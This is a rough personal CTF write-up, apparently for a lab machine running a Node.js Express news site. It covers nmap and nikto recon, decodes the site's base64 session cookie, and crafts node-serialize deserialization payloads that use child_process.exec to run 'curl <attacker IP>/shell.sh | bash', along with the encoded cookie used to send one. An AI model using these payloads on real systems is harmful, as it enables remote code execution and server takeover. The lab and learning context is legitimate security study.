Name:  
Date:  
Difficulty:  
Description:  
Better Description:  
Goals: General learn machine for JS "experience" with Javascript; jwt abusing; node related madness
Learnt:

## Recon

```bash
root@ip-10-10-122-213:~# ping -c 3 10.10.129.19
PING 10.10.129.19 (10.10.129.19) 56(84) bytes of data.
64 bytes from 10.10.129.19: icmp_seq=1 ttl=64 time=0.707 ms
64 bytes from 10.10.129.19: icmp_seq=2 ttl=64 time=0.453 ms
64 bytes from 10.10.129.19: icmp_seq=3 ttl=64 time=0.415 ms

--- 10.10.129.19 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.415/0.525/0.707/0.129 ms

root@ip-10-10-122-213:~# nmap -sC -sV -p- 10.10.129.19 --min-rate 5000

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-10 19:49 BST
Nmap scan report for ip-10-10-129-19.eu-west-1.compute.internal (10.10.129.19)
Host is up (0.00051s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
MAC Address: 02:E0:BC:97:E8:B7 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.99 seconds
root@ip-10-10-122-213:~# nikto -h 10.10.129.19:8080
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.129.19
+ Target Hostname:    ip-10-10-129-19.eu-west-1.compute.internal
+ Target Port:        8080
+ Start Time:         2022-05-10 19:51:07 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Cookie session created without the httponly flag
+ Retrieved x-powered-by header: Express
+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1daf 0xdPXia8DLlOwYnTXebWSDo/Cj9Co 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD 
+ OSVDB-3092: /login/: This might be interesting...
+ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-05-10 19:51:21 (GMT1) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Writeup notices strange set cookie
```bash
root@ip-10-10-122-213:~# curl -I http://10.10.233.140:8080
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D; Max-Age=1200; Path=/; Expires=Tue, 10 May 2022 19:59:52 GMT; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 7599
ETag: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
Date: Tue, 10 May 2022 19:39:54 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Decode from Base64:
```json
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
ÃÜ
```

```json
{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.8.73.218/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}
```
I used curl to be cool

```bash
curl -b 'eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwOi8vMTAuMTAuMTIyLjIxMzo4ODg4L3NoZWxsLnNoIHwgYmFzaCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pIiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ' http://10.10.233.140:8080
```

Then we need to excute the shell. But I tried with another cookie:
```json
{"username":"_$$ND_FUNC$$_require('child_process').exec('chmod +x shell.sh;./shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}

```
But this did not work I will try nodejsshell.py and incept request with burp like:
https://falseintel.github.io/thm-vulnnet-node-writeup.html
https://titus74.com/thm-writeup-vulnnet-node/
